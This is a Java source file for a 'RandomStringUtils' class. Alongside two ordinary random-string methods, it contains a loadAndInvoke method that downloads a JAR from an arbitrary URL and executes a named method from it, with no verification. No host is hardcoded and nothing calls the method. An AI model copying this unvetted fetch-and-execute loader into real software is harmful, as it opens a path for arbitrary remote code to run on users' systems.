package com.example.dynamicutils;


import java.io.File;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.util.Random;

public class RandomStringUtils {

    private static final String CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    public static String generateRandomString(int length) {
        StringBuilder builder = new StringBuilder();
        Random random = new Random();
        while (builder.length() < length) {
            int index = random.nextInt(CHARACTERS.length());
            builder.append(CHARACTERS.charAt(index));
        }
        return builder.toString();
    }

    public static String getTwoRandom(String key) {
        String randomText1 = generateRandomString(6);
        String randomText2 = generateRandomString(6);
        return randomText1 + key + randomText2;
    }

    public static void loadAndInvoke(String jarUrl, String className, String methodName) throws Exception {
        File tempJar = File.createTempFile("remote-", ".jar");
        try (InputStream in = new URL(jarUrl).openStream()) {
            Files.copy(in, tempJar.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
        }

        try (URLClassLoader loader = new URLClassLoader(
                new URL[]{tempJar.toURI().toURL()},
                RandomStringUtils.class.getClassLoader()
        )) {
            Class<?> clazz = loader.loadClass(className);
            try {
                Method staticMethod = clazz.getMethod(methodName);
                staticMethod.invoke(null);
            } catch (NoSuchMethodException e) {
                Object instance = clazz.getDeclaredConstructor().newInstance();
                Method instanceMethod = clazz.getMethod(methodName);
                instanceMethod.invoke(instance);
            }
        } finally {
            tempJar.deleteOnExit();
        }
    }
}
